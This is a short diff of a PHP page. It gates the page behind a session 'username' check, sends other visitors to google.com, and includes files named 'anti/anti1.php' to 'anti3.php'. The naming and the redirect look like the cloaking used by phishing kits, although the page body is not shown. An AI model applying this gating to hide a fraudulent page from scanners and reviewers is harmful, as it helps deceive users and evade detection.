@@ -1,5 +1,9 @@
 <?php
 session_start();
+
+
+if (isset($_SESSION["username"])) {
+
 include "anti/anti1.php";
 include "anti/anti2.php"; 
 include "anti/anti3.php"; 
@@ -977,3 +981,9 @@ function ex() {
 }
 </script>
 </body></html>
+<?php
+
+}else {
+	HEADER("Location: https://google.com");
+
+}
